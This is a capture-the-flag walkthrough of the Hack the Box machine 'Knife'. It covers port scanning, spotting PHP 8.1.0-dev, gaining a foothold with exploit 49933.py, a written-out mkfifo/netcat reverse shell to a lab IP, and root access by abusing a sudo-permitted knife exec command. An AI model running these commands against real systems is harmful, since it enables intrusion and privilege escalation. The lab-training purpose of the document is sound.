# Hack the Box - Knife

```shell
root@kali# rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.10.242 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.242:22
Open 10.10.10.242:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn" on ip 10.10.10.242
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 17:07 IST
Initiating Parallel DNS resolution of 1 host. at 17:07
Completed Parallel DNS resolution of 1 host. at 17:07, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:07
Scanning 10.10.10.242 [2 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed Connect Scan at 17:07, 0.14s elapsed (2 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (0.14s latency).
Scanned at 2023-10-03 17:07:20 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

```shell
root@kali# rustscan -u 5000 -p 22,80 -a 10.10.10.242 -- -Pn -sC -sV
```

```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                                                   
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                                                                                   
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                                                                                                                   
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                                                   
The Modern Day Port Scanner.                                                                                                                                               
________________________________________                                                                                                                                   
: http://discord.skerritt.blog           :                                                                                                                                 
: https://github.com/RustScan/RustScan :                                                                                                                                   
 --------------------------------------                                                                                                                                    
Nmap? More like slowmap.🐢                                                                                                                                                 
                                                                                                                                                                           
[~] The config file is expected to be at "/home/superuser/.rustscan.toml"                                                                                                  
[~] Automatically increasing ulimit value to 5000.                                                                                                                         
Open 10.10.10.242:80                                                                                                                                                       
Open 10.10.10.242:22                                                                                                                                                       
[~] Starting Script(s)                                                                                                                                                     
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn -sC -sV" on ip 10.10.10.242                                                                                           
Depending on the complexity of the script, results may take some time to appear.                                                                                           
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.                                                                             
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 17:08 IST                                                                                                        
NSE: Loaded 156 scripts for scanning.                                                                                                                                      
NSE: Script Pre-scanning.                                                                                                                                                  
NSE: Starting runlevel 1 (of 3) scan.                                                                                                                                      
Initiating NSE at 17:08                                                                                                                                                    
Completed NSE at 17:08, 0.00s elapsed                                                                                                                                      
NSE: Starting runlevel 2 (of 3) scan.                                                                                                                                      
Initiating NSE at 17:08                                                                                                                                                    
Completed NSE at 17:08, 0.00s elapsed                                                                                                                                      
NSE: Starting runlevel 3 (of 3) scan.                                                                                                                                      
Initiating NSE at 17:08                                                                                                                                                    
Completed NSE at 17:08, 0.00s elapsed                                                                                                                                      
Initiating Parallel DNS resolution of 1 host. at 17:08                                                                                                                     
Completed Parallel DNS resolution of 1 host. at 17:08, 0.00s elapsed                                                                                                       
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                           
Initiating Connect Scan at 17:08                                                                                                                                           
Scanning 10.10.10.242 [2 ports]                                                                                                                                            
Discovered open port 22/tcp on 10.10.10.242                                                                                                                                
Discovered open port 80/tcp on 10.10.10.242                                                                                                                                
Completed Connect Scan at 17:08, 0.14s elapsed (2 total ports)                                                                                                             
Initiating Service scan at 17:08
Scanning 10.10.10.242 [2 ports]                                                                                                                                            
Discovered open port 22/tcp on 10.10.10.242                                                                                                                                
Discovered open port 80/tcp on 10.10.10.242                                                                                                                                
Completed Connect Scan at 17:08, 0.14s elapsed (2 total ports)                                                                                                             
Initiating Service scan at 17:08                                                                                                                                           
Scanning 2 services on 10.10.10.242
Completed Service scan at 17:08, 6.29s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.242.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 4.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.58s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
Nmap scan report for 10.10.10.242
Host is up, received user-set (0.14s latency).
Scanned at 2023-10-03 17:08:46 IST for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kg
mue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDC
nG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fs
n/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:08
Completed NSE at 17:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds
```

TCP 80 - HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2b4de6f6-928e-4a17-b356-438ba1d10537)

HTTP Headers
```http
HTTP/1.1 200 OK
Date: Tue, 03 Oct 2023 11:46:00 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 2406
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Directory Brute-force
```shell
root@kali# feroxbuster -u http://10.10.10.242 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -s 200 -n
```
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.242
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      220l      526w     5815c http://10.10.10.242/
[####################] - 2m     43010/43010   0s      found:1       errors:0      
[####################] - 2m     43008/43008   339/s   http://10.10.10.242/    
```

Search Exploits
```shell
root@kali# searchsploit php 8.1.0-dev
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9a6d5d5f-77da-4404-b41c-7ab103cc9c0d)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/aeb47e9b-a199-4e88-a4c5-f4af6fd5fb49)

```shell
searchsploit -m php/webapps/49933.py
```

Foothold
```shell
root@kali# python3 49933.py 
Enter the full host url:
http://10.10.10.242
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0b5ab08e-2358-4b28-987a-c8eed3cfa2d4)

Privilege Escalation
```shell
$ sudo -l
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b60d1e36-fb10-47a8-8d32-203b4583b59f)

Shell Upgrade
```shell
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 9000 >/tmp/f
```
```shell
root@kali# rlwrap nc -nlvvp 9000
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b4d6915-1455-4ead-9aad-1faddb30614b)

```shell
james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ab69d83b-a224-4102-9e0f-8f5b89e88eb9)
